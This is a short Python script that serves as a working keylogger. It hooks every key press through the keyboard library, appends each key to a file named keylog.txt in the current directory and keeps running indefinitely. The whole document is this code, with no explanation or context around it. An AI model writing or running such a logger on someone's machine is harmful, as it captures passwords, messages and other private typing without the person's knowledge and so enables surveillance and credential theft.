import keyboard
import os

def on_key_press(key):
    with open(os.path.join(os.getcwd(), "keylog.txt"), "a") as file:
        file.write(str(key))

keyboard.on_press(on_key_press)

keyboard.wait()
